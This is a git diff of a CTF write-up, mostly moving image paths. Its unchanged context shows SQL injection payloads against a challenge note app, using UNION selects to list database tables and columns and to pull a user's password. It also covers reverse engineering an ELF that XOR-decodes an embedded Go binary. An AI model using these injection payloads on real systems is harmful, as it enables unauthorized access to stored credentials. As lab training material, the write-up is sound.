@@ -22,7 +22,7 @@ $query = "SELECT note from notes where username=$username;";
 
 So, the username parameter is injectable. Lets try some payloads... 
 
-<img src="/images/writeups/sogeti/01_add_note_example.png">
+<img src="/images/writeups/sogeti/web/01_add_note_example.png">
 
 ## [](#method-1)Method 1: Using the browser
 
@@ -30,24 +30,24 @@ So, the username parameter is injectable. Lets try some payloads...
 t35h' union select database()#
 ```
 
-<img src="/images/writeups/sogeti/04_result_database.png">
+<img src="/images/writeups/sogeti/web/04_result_database.png">
 
 ```text
 t35h' union select table_name from information_schema.tables#
 ```
 
-<img src="/images/writeups/sogeti/05_result_tables.png">
+<img src="/images/writeups/sogeti/web/05_result_tables.png">
 
 ```text
 t35h' union select column_name from information_schema.columns#
 ```
 
-<img src="/images/writeups/sogeti/06_result_columns.png">
+<img src="/images/writeups/sogeti/web/06_result_columns.png">
 
 ```text
 t35h' union select password from user limit 1#
 ```
-<img src="/images/writeups/sogeti/07_result_password.png">
+<img src="/images/writeups/sogeti/web/07_result_password.png">
 
 ## [](#method-2)Method 2: Using an overkill python script
 
@@ -149,9 +149,6 @@ if __name__ == '__main__':
 ```
 
 
-
-
-
 # [](#re1)RE: Be3rP4ck [ 495 points ] (Author: AK)
 
 This is a 64-bit ELF file. 
@@ -170,7 +167,7 @@ Flag: test
 
 Let's analyze the `main` function.
  
-<img src="/images/writeups/sogeti/re1_01.png">
+<img src="/images/writeups/sogeti/re/re1_01.png">
 
 The user input is stored in `[rbp+string]`. The program performs several operations on our input: a `xor` with `0x87` and 4 `not`. Finally it is compared with the value stored at `unk_401210`. 
 
@@ -265,8 +262,9 @@ If an argument is given, we arrive on the function `fetch_data`. This is the fun
 .text:0000000000400F5B                 mov     eax, 1
 ...
 ```
-I put a breakpoint at `0x400F56 call mb_xor` and I noticed that `rdi` contains the chars "ELF" after executing this instruction. 
-<img src="/images/writeups/sogeti/re1_02.png">
+I put a breakpoint at `0x400F56 call mb_xor` and I noticed that `rdi` contains the chars "ELF" after executing this instruction.
+<br /><br />
+<img src="/images/writeups/sogeti/re/re1_02.png">
 
 So I extracted the 0x13455c bytes of data (size in `rsi`) stored at the address contained in `rdi` and I got a new ELF file which corresponds to the real program. 
 ```
@@ -276,7 +274,9 @@ real_program: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically li
 
 ## [](#part-3) Analysing the real program
 It's a program written in Go. The main.main function is called `runtime_text` here. 
-<img src="/images/writeups/sogeti/re1_03.png">
+<br /><br />
+<img src="/images/writeups/sogeti/re/re1_03.png">
+<br /><br />
 After examining this function, I noticed that if I enter "almost_it", it would print another wrong flag...
 
 ```assembly
